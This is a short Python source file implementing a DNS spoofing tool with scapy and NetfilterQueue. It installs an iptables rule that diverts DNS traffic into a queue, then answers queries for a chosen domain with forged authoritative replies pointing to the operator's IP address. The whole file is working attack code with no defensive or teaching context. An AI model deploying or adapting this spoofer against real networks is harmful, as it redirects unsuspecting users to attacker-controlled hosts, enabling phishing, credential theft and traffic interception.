from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import sys
import threading

class DNSspoof(object):

	def __init__(self,domain,myip):
		self.domain = domain
		self.myip = myip
		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')


	def callback(self, packet):
		payload = packet.get_payload()
		pkt = IP(payload)

		if not pkt.haslayer(DNSQR):
			packet.accept()
		else:
			if self.domain in pkt[DNS].qd.qname:
				new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        	              		      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                		      	      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              		      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.myip))				
				packet.set_payload(str(new_pkt))
				packet.accept()
			else:
				packet.accept()

	def start(self):
		try:
			self.q = NetfilterQueue()
			self.q.bind(1, self.callback)
			self.q.run()
		except Exception as e:
			print "[*] Exception caught: {}".format(e) 

	def stop(self):
		self.q.unbind()
		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
		sys.exit(0)


	def main(self):
		t = threading.Thread(name='DNSspoof', target=self.start)
		t.setDaemon(True)
		t.start()
